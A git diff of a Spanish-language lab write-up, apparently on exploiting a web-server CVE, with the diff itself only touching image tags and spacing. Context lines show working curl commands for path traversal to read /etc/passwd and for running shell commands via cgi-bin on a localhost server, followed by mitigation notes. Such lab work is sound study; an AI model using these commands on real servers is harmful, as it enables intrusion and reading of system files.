@@ -1,4 +1,3 @@
-<img width="873" height="383" alt="serverSideSadness" src="https://github.com/user-attachments/assets/862183e3-ec6f-4407-8440-76b0e0a9a021" />
 ## alfa introducción
 ### 1. Selección del CVE
 
@@ -110,6 +109,9 @@ El ataque es muy sencillo, una vez identificado un servidor mal configurado y vu
 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`
 
 <img width="458" height="563" alt="traversal" src="https://github.com/user-attachments/assets/74989481-0b46-4853-abd8-aef67575744f" />
+
+
+
 <img width="463" height="92" alt="traversal2" src="https://github.com/user-attachments/assets/572d3d6c-0e44-4ff3-bf57-8d2d21efbf1f" />
 
 
@@ -117,6 +119,7 @@ Si el servidor permite la ejecución de scripts, es posible enviar un payload co
 `curl -s --data "echo; echo; echo 'buddy u dun fucked up';" "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"`
 
 <img width="454" height="129" alt="clientSideCracked" src="https://github.com/user-attachments/assets/522c2367-ab04-4270-b38d-9e7290efedef" />
+
 
 <img width="700" height="316" alt="clientSideCracking" src="https://github.com/user-attachments/assets/f0c2ed88-91b6-48c9-a215-8239a80a2e37" />
 
@@ -131,6 +134,7 @@ Otra forma de prevenirlo es tener un control de acceso bien configurado (princip
 Un mecanismo que evita que este ataque llegue a la ejecución de código arbitrario es limitar el uso de scripts en un servidor, ya sea por completo o solo permitir la ejecución de scripts firmados.
 
 <img width="881" height="51" alt="serverSideFix1" src="https://github.com/user-attachments/assets/7e15cbb9-9f1b-4c74-b263-b7392fcb9c40" />
+
 
 <img width="470" height="98" alt="foiled1" src="https://github.com/user-attachments/assets/98c26595-229e-45bf-a3f9-c59f6389c56a" />
 
